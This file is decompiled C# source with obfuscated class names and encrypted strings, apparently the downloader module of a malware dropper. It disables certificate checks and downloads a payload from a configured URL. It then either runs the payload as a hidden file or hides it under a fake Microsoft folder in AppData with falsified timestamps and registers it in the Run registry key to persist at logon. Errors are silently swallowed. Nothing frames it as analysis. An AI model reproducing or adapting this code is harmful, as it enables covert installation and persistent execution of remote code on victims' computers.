using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns14;
using ns21;

namespace ns12;

public class GClass12
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			ServicePointManager.ServerCertificateValidationCallback = Class0.smethod_16;
			WebClient webClient = new WebClient();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text = Path.GetTempFileName() + Path.GetFileName(GClass20.string_40);
			object objectValue = RuntimeHelpers.GetObjectValue(Class0.smethod_27("WgmyPMz2uu5LAZJLhPcNqjFxIzL2B6FlxhV2GHeubSk="));
			object objectValue2 = RuntimeHelpers.GetObjectValue(Class0.smethod_27("TscoVLHw0PtQwAgRRrOcnw=="));
			string text2 = Conversions.ToString(6);
			if (Operators.CompareString(GClass20.string_40, "", false) != 0)
			{
				if (GClass20.bool_17)
				{
					if (Operators.CompareString(Class0.smethod_6("Downloader"), "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==", false) != 0)
					{
						webClient.DownloadFile(GClass20.string_40, text);
						File.SetAttributes(text, FileAttributes.Hidden);
						Process.Start(text);
						Class0.smethod_9("Downloader", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
					}
				}
				else
				{
					webClient.DownloadFile(GClass20.string_40, text);
					Directory.CreateDirectory(folderPath + "\\Microsoft\\" + Class0.smethod_19(6));
					Directory.SetCreationTime(folderPath + "\\Microsoft\\" + Class0.smethod_19(6), GClass20.dateTime_0);
					Directory.SetLastAccessTime(folderPath + "\\Microsoft\\" + Class0.smethod_19(6), GClass20.dateTime_1);
					File.Move(text, Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\"), Operators.AddObject((object)(Class0.smethod_19(6) + "\\"), objectValue))));
					FileSystem.SetAttr(Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\"), Operators.AddObject((object)(Class0.smethod_19(6) + "\\"), objectValue))), (FileAttribute)Conversions.ToInteger(text2));
					FileSystem.SetAttr(folderPath + "\\Microsoft\\" + Class0.smethod_19(6), (FileAttribute)Conversions.ToInteger(text2));
					Class0.smethod_21(folderPath + "\\Microsoft\\" + Class0.smethod_19(6));
					Thread.Sleep(100);
					Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Conversions.ToString(objectValue2), Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\" + Class0.smethod_19(6) + "\\"), objectValue));
				}
			}
			try
			{
				webClient.Dispose();
				webClient = null;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
